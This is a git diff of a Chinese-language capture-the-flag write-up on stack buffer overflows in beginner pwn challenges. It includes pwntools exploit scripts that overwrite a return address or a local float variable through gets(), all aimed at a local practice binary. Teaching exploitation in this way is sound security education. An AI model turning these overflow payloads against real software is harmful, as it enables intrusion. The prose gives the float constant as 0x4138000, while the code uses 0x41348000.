@@ -33,7 +33,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 看到一个不限制输入长度的`gets()`函数，并且根据ida的分析，s位于栈底（rbp）上方`0xF`处,那么我们输入0xF字节之后再覆盖掉rbp，是不是就到了rbp下面的返回地址处？那么我们把后门函数的地址写在返回地址处，不就可以跳转到后门函数了嘛
 
-> 为什么rbp下面是rbp？罚你看`basic`中的`汇编速通`
+> 为什么rbp下面是返回地址？罚你看[这篇](../basic/汇编速通.md)
 
 exp:
 
@@ -45,6 +45,10 @@ p.interactive()
 ```
 
 ## 3 warmup_csaw_2016
+
+和上一题是一样的，可以将v5和rbp覆盖，然后篡改返回地址
+
+exp:
 
 ```python
 from pwn import *
@@ -59,21 +63,45 @@ p.interactive()
 
 ## 4 ciscn_2019_n_1
 
-两种思路，一种是覆盖返回地址，一种是覆盖v2
+看下ida逆出来的代码
+
+![image-20250222233345553](./images/image-20250222233345553.png)
+
+发现想要获取flag的内容，需要`v2=11.28125`,但是，我们一定要让if执行嘛，一定要合程序的意嘛，都打pwn了，怎么可以顺着程序的意来呢
+
+所以有两种思路，一种是覆盖返回地址，一种是覆盖v2
+
+1. 覆盖返回地址，直接`return system`处
+
+   exp:
 
 ```python
 from pwn import *
 p = process('./pwn')
 retaddr=0x4006BE
-payload=b'a'*56+p32(retaddr)
+payload=b'a'*56+p64(retaddr)
 p.sendline(payload)
 p.interactive()
 ```
 
+2. 覆盖v2数值
+
+   可以看到我们的输入是在v2赋值之后的事，所以可以通过溢出来把v2的值给覆盖了，`0x2c = 0x30-0x4`
+
+   > 不知道为什么填充的是`0x4138000`?学一下浮点数的存储叭，或者，按下tab，对准那个黄色的地方双击（如果不是这样子的话按下空格）
+   >
+   > <img src="./images/image-20250222234229981.png" alt="image-20250222234229981" style="zoom: 50%;" />
+   >
+   > 你就得到了11.28125的十六进制存储
+   >
+   > ![image-20250222234041347](./images/image-20250222234041347.png)
+
+exp：
+
 ```python
 from pwn import *
 p = process('./pwn')
-payload = b'a'*0x2c+p64(0x41348000)	# 可以看ida里面，有写v2的偏移
+payload = b'a'*0x2c+p64(0x41348000)
 p.sendline(payload)
 p.interactive()
 ```
